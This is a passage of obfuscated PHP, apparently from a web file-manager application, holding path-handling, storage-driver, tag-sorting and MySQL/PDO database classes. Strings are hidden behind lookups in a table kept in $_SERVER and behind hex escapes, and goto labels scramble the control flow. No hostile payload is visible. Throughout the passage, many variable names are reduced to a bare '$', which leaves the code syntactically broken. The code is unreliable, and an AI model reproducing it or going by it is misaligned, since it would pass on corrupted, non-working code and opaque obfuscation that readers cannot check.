$ې[285]), $ې[53], $η); $η = str_replace($ې[97], $ې[8], $η); $󄸲 = $ې[1465]; if (substr($η, 0, 3) == $ې[1466]) { $η = substr($η, 3); } while (strstr($η, $󄸲)) { $η = str_replace($󄸲, $ې[8], $η); } $η = preg_replace($ې[1467], $ې[8], $η); if ($η == $ې[8]) { return $ې[8]; } $η = rtrim($η, $ې[8]); return $η; } public static function pathTrue($؀Ȟ) { $͊̀ =& $_SERVER[ܮ]; if (!$؀Ȟ) { return $͊̀[12]; } $؀Ȟ = str_replace($͊̀[254], $͊̀[8], str_replace($͊̀[1468], $͊̀[8], $؀Ȟ)); $؀Ȟ = str_replace($͊̀[254], $͊̀[8], str_replace($͊̀[1468], $͊̀[8], $؀Ȟ)); if (!strstr($؀Ȟ, $͊̀[1466])) { return $؀Ȟ; } $ = explode($͊̀[8], $؀Ȟ); foreach ($ as $ => $ڬ) { if ($ڬ !== $͊̀[1469]) { continue; } for ($҈ = $; $҈ >= 0; $҈--) { if ($[$҈] === $͊̀[10] || $[$҈] === $͊̀[1469] || $[$҈] === -1) { continue; } if ($[$҈] === $͊̀[12]) { $[$] = -1; break; } $[$] = -1; $[$҈] = -1; break; } } $δ = array(); foreach ($ as $ڬ) { if ($ڬ !== -1) { $δ[] = $ڬ; } } $ = implode($͊̀[8], $δ); if (strpos($, $͊̀[1470]) === 0) { $ = $͊̀[1466] . substr($, strlen($͊̀[1470])); } return $; } public static function pathUrlClear($) { $պǅ =& $_SERVER[ܮ]; if (!$) { return $; } $ = rawurldecode($); $ = str_replace($պǅ[1468], $պǅ[8], $); if (strpos($, $պǅ[76]) > 0) { $ = substr($, 0, strpos($, $պǅ[76])); } if (strpos($, $պǅ[1471]) > 0) { $ = substr($, 0, strpos($, $պǅ[1471])); } return $; } public static function sourceID($։ߚ) { $ =& $_SERVER[ܮ]; $⚨ = self::parse($։ߚ); if ($⚨[$[33]] !== self::KOD_SOURCE) { show_json(LNG($[1472]), !1); } return $⚨[$[487]]; } public static function make($ʾˍ) { if (!$ʾˍ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ʾˍ)); } public static function makeShare($ї, $) { return self::makePath(self::KOD_SHARE_ITEM, $ї, $); } public static function makeFileTypePath($嵗) { return self::makePath(self::KOD_USER_FILE_TYPE, $嵗); } public static function makeFileTagPath($˕) { return self::makePath(self::KOD_USER_FILE_TAG, $˕); } public static function makePath($ۖ, $č = '', $˲ = '') { $ =& $_SERVER[ܮ]; $ = substr($ۖ, 1, -1); $ = $[1473] . $ . $[1474] . $č . $[1475]; $ = $˲ ? $ . $˲ . $[8] : $; return $; } public static function hashPath($쁽, $ܕ = false) { $ٻ =& $_SERVER[ܮ]; if (!$쁽) { return $ٻ[12]; } $衑 = is_array($쁽) ? $쁽 : IO::info($쁽); $Ȼ = _get($衑, $ٻ[1476], $ٻ[12]); if (!$Ȼ && isset($衑[$ٻ[557]])) { $Ȼ = $衑[$ٻ[557]]; } if (!$Ȼ && isset($衑[$ٻ[235]])) { $Ȼ = trim($衑[$ٻ[235]], $ٻ[118]); } if ($Ȼ) { return $Ȼ; } if (!$Ȼ && isset($衑[$ٻ[191]]) && $衑[$ٻ[191]]) { $衑 = IO::info(KodIO::make($衑[$ٻ[191]])); $Ȼ = _get($衑, $ٻ[1476], $ٻ[12]); if (!$Ȼ && isset($衑[$ٻ[557]])) { $Ȼ = $衑[$ٻ[557]]; } } $ = md5($衑[$ٻ[87]] . $衑[$ٻ[79]] . $衑[$ٻ[88]]); $ = $ . $ٻ[1477]; $Ȼ = $Ȼ ? $Ȼ : Cache::get($); if (!$Ȼ && $ܕ) { $Ȼ = IO::hashSimple($衑[$ٻ[87]]); Cache::set($, $Ȼ ? $Ȼ : $, 3600 * 24 * 30); } return $Ȼ ? $Ȼ : $; } public static function hashPathSafe($ܗߨ, $؈ï = false) { $Ë =& $_SERVER[ܮ]; $р = self::hashPath($ܗߨ, $؈ï); return md5($р . $Ë[1478] . Model($Ë[871])->get($Ë[872])); } public static function initSystemPath() { $ो =& $_SERVER[ܮ]; if (defined($ो[1479])) { return; } define($ो[1479], self::systemPath($ो[189])); define($ो[1480], self::systemPath($ो[1481])); define($ो[1482], self::systemPath($ो[1483])); define($ो[1484], self::systemPath($ो[1485])); IOHistory::bindEvent(); } public static function systemPath($ι֠) { $ =& $_SERVER[ܮ]; $ = $[1486] . ucfirst($ι֠); $ΰ = Model($[871])->get($); if ($ΰ) { return $ΰ; } if ($ι֠ == $[189]) { $ΰ = self::make(Model($[939])->systemRootPathAdd($[628])); } else { $ΰ = self::systemPath($[189]); $ = self::sourceID($ΰ); $ΰ = self::make(Model($[939])->mkdir($, $ι֠)); } Model($[871])->set($, $ΰ); return $ΰ; } public static function systemFolder($ä) { $ = IO_PATH_SYSTEM_SOURCE . $ä; $ = Cache::get($); if (!$) { $ٴ = IO::infoFullSimple($); if (!$ٴ) { $ = IO::mkdir($, REPEAT_SKIP); } else { $ = $ٴ[$_SERVER[ܮ][87]]; } Cache::set($, $, 3600 * 10); } return $; } public static function defaultDriver() { return Model($_SERVER[ܮ][866])->defaultDriver(); } public static function defaultDriverInit() { $ =& $_SERVER[ܮ]; static $ǧ = false; if ($ǧ) { return $ǧ; } $┠ڐ = self::defaultDriver(); $ǧ = IO::init($[1487] . $┠ڐ[$[487]] . $[1475]); return $ǧ; } public static function fileTypeList() { $ը =& $_SERVER[ܮ]; $ = $GLOBALS[$ը[6]][$ը[1488]]; foreach ($ as $λ => $) { $ώ = $ը[1489] . $λ; $͂ = LNG($ώ); if ($ώ != $͂) { $[$λ][$ը[32]] = $͂; } } return $; } public static function ioFileDriverGet($Ç = '') { $ =& $_SERVER[ܮ]; static $̉ = array(); static $ʈ = array(); static $ȷ = array(); static $ڗ = false; if ($ڗ === !1) { $ڗ = array($[598] => array(), $[684] => array()); $ = Model($[1490])->get(!1, $[1491]); foreach ($ as $ => $ܖߑ) { if (!$ܖߑ || $ܖߑ == $[12]) { continue; } if (strstr($, $[1492])) { $ = str_replace($[1492], $[12], $); $ڗ[$[598]][$] = $ܖߑ; } else { if (strstr($, $[1493])) { $ = str_replace($[1493], $[12], $); $ڗ[$[684]][$] = $ܖߑ; } } } } $ = self::defaultDriver(); if (!$Ç || !$ڗ[$[598]] && !$ڗ[$[684]]) { return $; } $ = self::getPathSourceID($Ç); if (!$) { return $; } if (isset($̉[$])) { return $̉[$]; } $ = Model($[939])->sourceInfo($); $٥ = $[$[589]]; $򬧄 = array(); if (!$) { return $; } if ($[$[188]] == $[91]) { if (isset($ȷ[$٥])) { return $ȷ[$٥]; } if (isset($ڗ[$[684]][$٥])) { $Φ = Model($[866])->driverInfo($ڗ[$[684]][$٥]); $ = $Φ ? $Φ : $; $ȷ[$٥] = $; $̉[$] = $; return $; } $򬧄 = self::groupParentUser($٥); } else { if ($[$[188]] == $[524]) { $ = Model($[1494])->getInfo($٥); if ($) { $򬧄 = explode($[50], trim($[$[604]], $[50])); $򬧄 = array_remove_value($򬧄, $[228]); $򬧄[] = $٥; $򬧄 = array_reverse($򬧄); } } } foreach ($򬧄 as $) { if (!isset($ڗ[$[598]][$])) { continue; } if (isset($ʈ[$])) { return $ʈ[$]; } $Φ = Model($[866])->driverInfo($ڗ[$[598]][$]); $ = $Φ ? $Φ : $; $ʈ[$] = $; break; } if ($[$[188]] == $[91]) { $ȷ[$٥] = $; } $̉[$] = $; return $; } private static function getPathSourceID($𷪱) { $נ߲ =& $_SERVER[ܮ]; static $ = array(); if (!$𷪱) { return $נ߲[12]; } $ͼ = substr($𷪱, 0, strlen($נ߲[498])) == $נ߲[498]; $󘒀 = substr($𷪱, 0, strlen($נ߲[1461])) == $נ߲[1461]; $Ⲏ = substr($𷪱, 0, strlen($נ߲[1462])) == $נ߲[1462]; if (!$ͼ && !$󘒀 && !$Ⲏ) { return $נ߲[12]; } $ = self::parse($𷪱); $ = $[$נ߲[1357]]; if ($ͼ) { return $[$נ߲[487]]; } if (isset($[$])) { $ = $[$]; } else { $ = IO::init($); $[$] = $; } if (isset($->pathParse[$נ߲[1360]])) { return $->pathParse[$נ߲[1360]]; } return $נ߲[12]; } private static function groupParentUser($Փɿ) { $ =& $_SERVER[ܮ]; $ = Model($[617])->getInfo($Փɿ); if (!$) { return array(); } $߭ = array_to_keyvalue($[$[1495]], $[12], $[1496]); $ = array(); foreach ($[$[1495]] as $ץ) { $[] = $ץ[$[1496]]; $庼 = explode($[50], trim($ץ[$[604]], $[50])); $庼 = array_remove_value($庼, $[228]); $庼 = array_reverse($庼); $ = array_merge($, $庼); } return array_unique($); } public static function diskList($賑 = true) { $ = $_SERVER[ܮ][1497]; if ($賑) { $Ń = Cache::get($); if (is_array($Ń)) { return $Ń; } } $Ń = self::diskListGet(); Cache::set($, $Ń, 60); return $Ń; } public static function diskListGet() { $􊊆 =& $_SERVER[ܮ]; $ܗ = array(); if ($GLOBALS[$􊊆[6]][$􊊆[1498]] == $􊊆[1499]) { $Ć = $􊊆[1500]; for ($Ɋ = 0; $Ɋ < strlen($Ć); $Ɋ++) { $ = $Ć[$Ɋ] . $􊊆[1501]; if (file_exists($)) { $ܗ[] = $; } } return $ܗ; } if (!function_exists($􊊆[98])) { $ܗ[] = $􊊆[998]; return $ܗ; } $ = explode($􊊆[285], shell_exec($􊊆[1502])); array_shift($); array_pop($); $ċ = array($􊊆[1503], $􊊆[1504], $􊊆[1505], $􊊆[1506], $􊊆[1507], $􊊆[1508], $􊊆[1509], $􊊆[1510]); foreach ($ as $Ȥ) { $̚ = preg_split($􊊆[1511], $Ȥ); $ = $̚[count($̚) - 1]; if (!strstr($̚[0], $􊊆[1512]) || !$) { continue; } $Ȣ = rtrim($, $􊊆[8]) . $􊊆[8]; $ܗ[] = $Ȣ; } return $ܗ; } public static function isSameDisk($, $ՑӃ) { $ԋ =& $_SERVER[ܮ]; if ($GLOBALS[$ԋ[6]][$ԋ[1498]] == $ԋ[1499]) { return strtolower(substr($, 0, 1)) == strtolower(substr($ՑӃ, 0, 1)); } $̇ = stat($); $ = stat($ՑӃ); if ($̇ === !1 || $ === !1) { return !1; } return $̇[$ԋ[1513]] === $[$ԋ[1513]]; $Ѿ = self::diskList(); $δ = !1; $ = !1; sort($Ѿ); $Ѿ = array_reverse($Ѿ); $ = rtrim($, $ԋ[8]) . $ԋ[8]; $ՑӃ = rtrim($ՑӃ, $ԋ[8]) . $ԋ[8]; foreach ($Ѿ as $辧) { $ = strlen($辧); if (!$δ && substr($, 0, $) == $辧) { $δ = $辧; } if (!$ && substr($ՑӃ, 0, $) == $辧) { $ = $辧; } if ($δ && $) { break; } } return $δ === $; } public static function transferType($, $ޟ) { $ =& $_SERVER[ܮ]; $Ш = self::driverType($); $ = self::driverType($ޟ); if ($Ш[$[33]] == $[$[33]] && $Ш[$[1514]] == $[$[1514]]) { return $[1515]; } if ($Ш[$[33]] == $[1032] && $[$[33]] == $[106]) { return $[1386]; } if ($Ш[$[33]] == $[106] && $[$[33]] == $[1032]) { return $[107]; } return $[1516]; } public static function driverType($Ε) { $ =& $_SERVER[ܮ]; $ã몑 = str_replace($[1517], $[12], strtolower($Ε->getType())); if ($ã몑 == $[856] || $ã몑 == $[1518] || $ã몑 == $[1519]) { $ = self::ioFileDriverGet($[498] . $Ε->pathParse[$[1360]] . $[402]); $Ε = IO::init($[1487] . $[$[487]] . $[1475]); } else { if ($ã몑 == $[1395] || $ã몑 == $[1520]) { $Ε = IO::init($Ε->pathParse[$[1337]]); } } $ҭ = $Ε->path; $ã몑 = str_replace($[1517], $[12], strtolower($Ε->getType())); if ($ã몑 == $[106]) { return array($[33] => $[106], $[1514] => $[12], $[87] => $ҭ, $[96] => $Ε); } return array($[33] => $[1032], $[1514] => $Ε->pathDriver, $[87] => $ҭ, $[96] => $Ε); } public static function pathDriverType($) { return $ ? self::driverType(IO::init($)) : !1; } public static function pathDriverLocal($ɲ) { $ڞ =& $_SERVER[ܮ]; $ = $ɲ ? self::driverType(IO::init($ɲ)) : !1; return strtolower($[$ڞ[33]]) == $ڞ[106] ? !0 : !1; } public static function allowCover($ǉ, $ꇐ = true) { $ۋ =& $_SERVER[ܮ]; if (is_string($ǉ)) { $ǉ = IO::info($ǉ); } if (!$ǉ || $ǉ[$ۋ[33]] == $ۋ[78] || $ǉ[$ۋ[79]] <= 100) { return !1; } if (isset($ǉ[$ۋ[1521]]) || !$ǉ[$ۋ[87]]) { return !1; } if (isset($ǉ[$ۋ[232]]) && !$ǉ[$ۋ[232]]) { return !1; } static $Ǳ = false; if (!$Ǳ || !$ꇐ) { $ء = self::driverType(IO::init($ǉ[$ۋ[87]])); $݅ = $ء[$ۋ[96]]; $Ǳ = $ۋ[194]; if ($ء[$ۋ[33]] == $ۋ[106]) { $Ǳ = $ۋ[1522]; } if ($ء[$ۋ[96]] && is_array($ء[$ۋ[96]]->config)) { $ = $ء[$ۋ[96]]->config; if (isset($[$ۋ[1523]]) && $[$ۋ[1523]]) { $Ǳ = $ۋ[1522]; } } $帤 = KodIO::defaultDriver(); if (strtolower($帤[$ۋ[96]]) == $ۋ[106] && is_array($帤[$ۋ[6]])) { $ = $帤[$ۋ[6]][$ۋ[1369]]; if (substr($, 0, 2) == $ۋ[1524]) { $ = str_replace($ۋ[1524], BASIC_PATH, $); } $ = str_replace($ۋ[254], $ۋ[8], $); if (substr($ǉ[$ۋ[87]], 0, strlen($)) == $) { $Ǳ = $ۋ[194]; } } } return $Ǳ == $ۋ[1522] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($) { parent::__construct($); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto b; C: class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\x65\162\x2e\164\x61\x67\114\x69\x73\164"; public $modelType = "\x55\x73\x65\x72\117\160\164\x69\157\156"; public $field = array("\x6e\141\x6d\x65", "\x73\164\171\x6c\145", "\x73\x6f\162\164"); public function listData($˝̉ = false, $ = "\163\157\162\x74", $ض = false) { return parent::listData($˝̉, $, $ض); } public function remove($Ϸ) { return parent::remove($Ϸ); } public function add($ݡ, $݇Ƈ = "\154\x61\142\x65\154\55\x67\162\x65\171\55\156\157\162\155\141\x6c") { $˙ܬ =& $_SERVER[ܮ]; if ($this->findByName($ݡ)) { return !1; } $ա = array($˙ܬ[509] => $ݡ, $˙ܬ[574] => $݇Ƈ, $˙ܬ[2186] => $this->getSort($˙ܬ[335]) + 1); return parent::insert($ա); } public function update($劳, $砫) { $ =& $_SERVER[ܮ]; $ޱ = $this->listData($劳); $چ = $this->findByName($砫[$[32]]); if (!$ޱ || $چ && $چ[$[487]] != $ޱ[$[487]]) { return !1; } return parent::update($劳, $砫); } public function moveTop($ܬ͸) { $◪ =& $_SERVER[ܮ]; $̯ = parent::listData(); $꿘 = $this->getSort($◪[334]); foreach ($̯ as &$) { if ($[$◪[487]] == $ܬ͸) { $[$◪[2204]] = $꿘; continue; } $[$◪[2204]] += 1; } unset($); return parent::resetData($̯); } public function moveBottom($ː) { $黡 =& $_SERVER[ܮ]; $ܖ = $this->getSort($黡[335]) + 1; return parent::update($ː, array($黡[2204] => $ܖ)); } public function resetSort($כ) { $ =& $_SERVER[ܮ]; $ӎ = array(); $כ = is_array($כ) ? $כ : array(); for ($ = 0; $ < count($כ); $++) { $ӎ[$כ[$] . $[12]] = $ + 1; } $ = parent::listData(); foreach ($ as &$) { $圯 = $ӎ[$[$[487]]]; $[$[2204]] = $圯 ? $圯 : $[$[2204]]; } unset($); return parent::resetData($); } private function getSort($) { $Ċ =& $_SERVER[ܮ]; $ = parent::listData(); $О = array_to_keyvalue($, $Ċ[12], $Ċ[2204]); if (!$О) { $О = array(0); } $ = $ == $Ċ[335] ? max($О) : min($О); return intval($); } } goto D; c氖: class DbMysqli extends Db { public function __construct($Շ = '') { $ħ =& $_SERVER[ܮ]; if (!extension_loaded($ħ[1077])) { think_exception(think_lang($ħ[14]) . $ħ[1078]); } if (!empty($Շ)) { $this->config = $Շ; if (empty($this->config[$ħ[17]])) { $this->config[$ħ[17]] = $ħ[12]; } } } public function connect($ = '', $ = 0) { $܊ =& $_SERVER[ܮ]; if (!isset($this->linkID[$])) { if (empty($)) { $ = $this->config; } $this->linkID[$] = new mysqli($[$܊[1048]], $[$܊[1050]], $[$܊[1051]], $[$܊[21]], $[$܊[1049]] ? intval($[$܊[1049]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ = $this->linkID[$]->server_version; $this->linkID[$]->query($܊[1052] . think_config($܊[1053]) . $܊[58]); if ($ > $܊[1054]) { $this->linkID[$]->query($܊[1055]); } $this->connected = !0; if (1 != think_config($܊[22])) { unset($this->config); } } return $this->linkID[$]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($) { $ۺ =& $_SERVER[ܮ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $; if ($this->queryID) { $this->free(); } think_action_status($ۺ[23], 1); think_status($ۺ[24]); $this->queryID = $this->_linkID->query($); if ($this->_linkID->more_results()) { while (($ҡ䢯 = $this->_linkID->next_result()) != NULL) { $ҡ䢯->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($) { $ȩ =& $_SERVER[ܮ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $; if ($this->queryID) { $this->free(); } think_action_status($ȩ[25], 1); think_status($ȩ[24]); $Ŷ = $this->_linkID->query($); $this->debug(); if (!1 === $Ŷ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $˜ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$˜) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ҫ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ҫ) { $this->error(); return !1; } } return !0; } private function getAll() { $ˋ = array(); if ($this->numRows > 0) { for ($ = 0; $ < $this->numRows; $++) { $ˋ[$] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ˋ; } public function getFields($Ǻ) { $ަ =& $_SERVER[ܮ]; $ = $this->query($ަ[1059] . $this->parseKey($Ǻ)); $ǿڤ = array(); if ($) { foreach ($ as $ʋ => $) { $ǿڤ[$[$ަ[31]]] = array($ަ[32] => $[$ަ[31]], $ަ[33] => $[$ަ[34]], $ަ[35] => (bool) ($[$ަ[36]] === $ަ[12]), $ަ[37] => $[$ަ[38]], $ަ[39] => strtolower($[$ަ[40]]) == $ަ[41], $ަ[42] => strtolower($[$ަ[43]]) == $ަ[44]); } } return $ǿڤ; } public function getTables($ԟ = '') { $ =& $_SERVER[ܮ]; $ڛ = !empty($ԟ) ? $[1061] . $ԟ . $[1062] : $[1063]; $ = $this->query($ڛ); $Ќ = array(); if ($) { foreach ($ as $ => $) { $Ќ[$] = current($); } } return $Ќ; } public function replace($, $ˠ = array()) { $ǖ =& $_SERVER[ܮ]; foreach ($ as $؆ => $) { $Ɨ = $this->parseValue($); if (is_scalar($Ɨ)) { $ո[] = $Ɨ; $[] = $this->parseKey($؆); } } $Ѯ = $ǖ[1064] . $this->parseTable($ˠ[$ǖ[357]]) . $ǖ[1065] . implode($ǖ[50], $) . $ǖ[1066] . implode($ǖ[50], $ո) . $ǖ[1067]; return $this->execute($Ѯ); } public function insertAll($, $ = array(), $ĭ = false) { $ =& $_SERVER[ܮ]; if (!is_array($[0])) { return !1; } $ɮ = array_keys($[0]); $ = array(); foreach ($ as $ష) { $ = array(); foreach ($ష as $ => $˄¡) { $˄¡ = $this->parseValue($˄¡); if (is_scalar($˄¡)) { $[] = $˄¡; } } $[] = $[337] . implode($[50], $) . $[1067]; } array_walk($ɮ, array($this, $[1068])); $ϑ = $ĭ ? $[1069] : $[1070]; $ϑ = $[1070]; $ = $ϑ . $[1071] . $this->parseTable($[$[357]]) . $[1065] . implode($[50], $ɮ) . $[1072] . implode($[50], $); if ($ĭ) { $߱ = array(); foreach ($ɮ as $) { if ($ == $[231] || $ == $[1073]) { continue; } $߱[] = $ . $[1074] . $ . $[1067]; } $ .= $[1075] . implode($[50], $߱); } return $this->execute($); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ź =& $_SERVER[ܮ]; $this->error = $this->_linkID->errno . $ź[4] . $this->_linkID->error; if ($ź[12] != $this->queryStr) { $this->error .= LNG($ź[48]) . $this->queryStr; } think_trace($this->error, $ź[12], $ź[49]); return $this->error; } public function escapeString($űʠ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($űʠ); } else { return addslashes($űʠ); } } public function parseKey(&$, $ԫ = true) { $̭ӿ =& $_SERVER[ܮ]; if ($ԫ) { $ = $this->parseKeyCheck($); } if ($ != $̭ӿ[220] && !preg_match($̭ӿ[1076], $)) { $ = $̭ӿ[475] . trim($, $̭ӿ[475]) . $̭ӿ[475]; } return $; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ = '') { $ϖ =& $_SERVER[ܮ]; if (!class_exists($ϖ[1079])) { think_exception(think_lang($ϖ[14]) . $ϖ[1080]); } if (!empty($)) { $this->config = $; if (empty($this->config[$ϖ[17]])) { $this->config[$ϖ[17]] = array(); } } } public function connect($ = '', $ = 0) { $蹃ʾ =& $_SERVER[ܮ]; if (!isset($this->linkID[$])) { if (empty($)) { $ = $this->config; } $賂 = !empty($[$蹃ʾ[17]][$蹃ʾ[18]]) ? $[$蹃ʾ[17]][$蹃ʾ[18]] : $this->pconnect; if ($賂) { $[$蹃ʾ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$] = new PDO($[$蹃ʾ[1081]], $[$蹃ʾ[1050]], $[$蹃ʾ[1051]], $[$蹃ʾ[17]]); } catch (PDOException $ۄ) { think_exception($ۄ->getMessage()); } $this->dbType = $this->_getDsnType($[$蹃ʾ[1081]]); if (in_array($this->dbType, array($蹃ʾ[1082], $蹃ʾ[1083], $蹃ʾ[1084], $蹃ʾ[1085]))) { think_exception($蹃ʾ[1086] . $this->dbType . $蹃ʾ[1087] . $this->dbType . $蹃ʾ[1088]); } if (!$this->linkID[$]) { think_exception($蹃ʾ[1089]); } try { $this->linkID[$]->exec($蹃ʾ[1090] . think_config($蹃ʾ[1053])); } catch (Exception $ۄ) { } $this->connected = !0; if (1 != think_config($蹃ʾ[22])) { unset($this->config); } } return $this->linkID[$]; } public function free() { $this->PDOStatement = null; } public function query($, $ = array()) { $ᛊ =& $_SERVER[ܮ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $; if (!empty($)) { $this->queryStr .= $ᛊ[1091] . print_r($, !0) . $ᛊ[1092]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ᛊ[23], 1); think_status($ᛊ[24]); $this->PDOStatement = $this->_linkID->prepare($); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ = $this->PDOStatement->execute($); $this->debug(); if (!1 === $) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($䶤, $ۺ = array()) { $ =& $_SERVER[ܮ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $䶤; if (!empty($ۺ)) { $this->queryStr .= $[1091] . print_r($ۺ, !0) . $[1092]; } $⵨ = !1; if ($this->dbType == $[1085]) { if (preg_match($[1093], $this->queryStr, $)) { $this->table = think_config($[1094]) . str_ireplace(think_config($[1095]), $[463], $[2]); $⵨ = (bool) $this->query($[1096] . strtoupper($this->table) . $[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($[25], 1); think_status($[24]); $this->PDOStatement = $this->_linkID->prepare($䶤); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $޲Χ = $this->PDOStatement->execute($ۺ); $this->debug(); if (!1 === $޲Χ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($⵨ || preg_match($[1097], $䶤)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ӂ = $this->_linkID->commit(); $this->transTimes = 0; if (!$ӂ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $р = $this->_linkID->rollback(); $this->transTimes = 0; if (!$р) { $this->error(); return !1; } } return !0; } private function getAll() { $ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($); return $; } public function getFields($в) { $י =& $_SERVER[ܮ]; $this->initConnect(!0); if (think_config($י[1098])) { $Ђ« = str_replace($י[1099], $в, think_config($י[1098])); } else { switch ($this->dbType) { case $י[1082]: case $י[1100]: $Ђ« = "\x53\105\114\105\x43\124\40\40\40\143\x6f\x6c\x75\155\x6e\137\x6e\141\x6d\145\40\141\163\40\x27\116\x61\x6d\x65\x27\54\x20\40\x20\x64\141\x74\141\137\x74\x79\x70\x65\40\141\163\40\x27\x54\171\160\x65\47\x2c\x20\x20\x20\x63\x6f\154\x75\155\156\137\144\145\x66\141\165\154\164\40\141\163\40\x27\x44\145\x66\x61\x75\x6c\x74\x27\x2c\40\x20\x20\x69\163\x5f\156\x75\154\154\141\142\154\x65\40\141\163\x20\47\116\x75\x6c\154\x27\12\11\x9\x46\x52\117\x4d\11\151\156\146\157\162\x6d\141\x74\151\157\x6e\x5f\163\x63\150\145\155\141\x2e\x74\141\x62\x6c\x65\163\40\x41\x53\40\164\12\x9\11\112\x4f\111\116\11\x69\x6e\x66\x6f\162\x6d\x61\x74\x69\157\x6e\x5f\x73\143\x68\x65\155\141\x2e\x63\x6f\154\x75\x6d\156\163\40\101\x53\x20\x63\12\11\x9\117\116\x20\x20\x74\56\x74\141\142\x6c\145\137\x63\x61\164\141\154\157\x67\40\75\40\143\x2e\x74\141\x62\154\x65\x5f\x63\141\164\x61\x6c\157\x67\xa\11\x9\101\x4e\104\40\164\56\x74\x61\x62\154\145\137\163\x63\x68\145\x6d\141\40\x3d\x20\x63\x2e\164\141\142\154\145\x5f\163\x63\150\x65\x6d\141\12\11\x9\x41\x4e\x44\x20\164\x2e\164\141\142\154\x65\x5f\156\141\155\145\40\75\40\143\x2e\x74\x61\x62\x6c\x65\137\x6e\x61\155\x65\12\11\x9\x57\110\105\x52\105\x20\x20\x20\164\x2e\164\141\142\154\x65\137\156\141\x6d\145\x20\75\x20\x27{$в}\x27"; break; case $י[1101]: $Ђ« = $י[1102] . $в . $י[1103]; break; case $י[1083]: case $י[1085]: $Ђ« = $י[1104] . $י[1105] . $י[1106] . strtoupper($в) . $י[1107] . strtoupper($в) . $י[1108]; break; case $י[1109]: $Ђ« = $י[1110] . $в . $י[1111]; break; case $י[1084]: break; case $י[1112]: default: $Ђ« = $י[1113] . ($this->dbType == $י[1112] ? "\x60{$в}\140" : $в); } } $ϛ = $this->query($Ђ«); $ = array(); if ($ϛ) { foreach ($ϛ as $ң => $) { $ = array_change_key_case($); $[$י[32]] = isset($[$י[32]]) ? $[$י[32]] : $י[463]; $[$י[33]] = isset($[$י[33]]) ? $[$י[33]] : $י[463]; $ = isset($[$י[351]]) ? $[$י[351]] : $[$י[32]]; $[$] = array($י[32] => $, $י[33] => $[$י[33]], $י[35] => (bool) (isset($[$י[103]]) && $[$י[103]] === $י[12] || isset($[$י[35]]) && $[$י[35]] === $י[12]), $י[37] => isset($[$י[37]]) ? $[$י[37]] : (isset($[$י[56]]) ? $[$י[56]] : $י[463]), $י[39] => isset($[$י[95]]) ? strtolower($[$י[95]]) == $י[41] : (isset($[$י[57]]) ? $[$י[57]] : !1), $י[42] => isset($[$י[1114]]) ? strtolower($[$י[1114]]) == $י[44] : (isset($[$י[95]]) ? $[$י[95]] : !1)); } } return $; } public function getTables($ܹ = '') { $ޅ =& $_SERVER[ܮ]; if (think_config($ޅ[1115])) { $Ѐ = str_replace($ޅ[1116], $ܹ, think_config($ޅ[1115])); } else { switch ($this->dbType) { case $ޅ[1083]: case $ޅ[1085]: $Ѐ = $ޅ[1117]; break; case $ޅ[1082]: case $ޅ[1100]: $Ѐ = $ޅ[1118]; break; case $ޅ[1109]: $Ѐ = $ޅ[1119]; break; case $ޅ[1084]: think_exception(think_lang($ޅ[1120]) . $ޅ[1121]); break; case $ޅ[1101]: $Ѐ = $ޅ[45] . $ޅ[46] . $ޅ[47]; break; case $ޅ[1112]: default: if (!empty($ܹ)) { $Ѐ = $ޅ[1061] . $ܹ . $ޅ[1062]; } else { $Ѐ = $ޅ[1063]; } } } $ = $this->query($Ѐ); $Ƃ = array(); foreach ($ as $ => $␿ξ) { $Ƃ[$] = current($␿ξ); } return $Ƃ; } protected function parseLimit($ժ) { $ָ =& $_SERVER[ܮ]; $ = $ָ[12]; if (!empty($ժ)) { switch ($this->dbType) { case $ָ[1109]: case $ָ[1101]: $ժ = explode($ָ[50], $ժ); if (count($ժ) > 1) { $ .= $ָ[51] . $ժ[1] . $ָ[52] . $ժ[0] . $ָ[53]; } else { $ .= $ָ[51] . $ժ[0] . $ָ[53]; } break; case $ָ[1082]: case $ָ[1100]: break; case $ָ[1084]: break; case $ָ[1083]: case $ָ[1085]: break; case $ָ[1112]: default: $ .= $ָ[51] . $ժ . $ָ[53]; } } return $; } public function parseKey(&$, $ݏ = true) { $ =& $_SERVER[ܮ]; if ($ݏ) { $ = 